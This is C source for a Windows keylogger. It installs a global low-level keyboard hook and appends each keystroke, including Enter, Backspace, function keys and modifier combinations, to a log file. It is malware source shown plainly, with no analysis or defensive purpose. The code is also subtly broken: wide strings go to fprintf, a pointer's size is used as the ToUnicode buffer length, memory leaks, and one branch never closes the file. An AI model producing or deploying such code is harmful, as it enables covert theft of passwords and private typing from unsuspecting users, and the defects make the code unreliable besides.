#include"Header.h"

int main()
{
    // Set up the low-level keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, &LogKey, NULL, 0);

    // Run the message loop
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    // Unhook the keyboard hook
    UnhookWindowsHookEx(hook);
    return 0;
}

// This is the callback function for the low-level keyboard hook
LRESULT CALLBACK LogKey(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Check if the event is a keydown event
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        // Get a pointer to the KBDLLHOOKSTRUCT
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        // Get the state of the key
        BYTE keyState[256];
        GetKeyboardState(keyState);

        // Translate the virtual key code and scan code into a Unicode character
        LPWSTR buffer = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));

        // Check if the translation was successful
        FILE* fp = NULL;
        _wfopen_s(&fp, PATH, L"ab");
        if (p->vkCode >= VK_F1 && p->vkCode <= VK_F24)
        {
            fprintf(fp, L"[F%d] ", p->vkCode - VK_F1 + 1);

        }
        else
        {
            switch (p->vkCode)
            {
            case VK_RETURN:
                fprintf(fp, L"Enter\n");
                break;
            case VK_BACK:
                fprintf(fp, L"Backspace\n");
                break;
            case VK_SPACE:
                fprintf(fp, L"Space\n");
                break;
            case VK_TAB:
                fprintf(fp, L"Tab\n");
                break;
            default:
               
                ToUnicode(p->vkCode, p->scanCode, keyState, buffer, sizeof(buffer) / sizeof(WCHAR), 0);
                 if (GetKeyState(VK_SHIFT) & 0x8000)
                    fprintf(fp, L"Shift+");
                else if (GetKeyState(VK_CONTROL) & 0x8000)
                    fprintf(fp, L"Ctrl+");
                else if (GetKeyState(VK_MENU) & 0x8000)
                    fprintf(fp, L"Alt+");
                fwrite(buffer, sizeof(WCHAR), wcslen(buffer), fp);
               
                break;
            }
            fclose(fp);
        }

        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
}
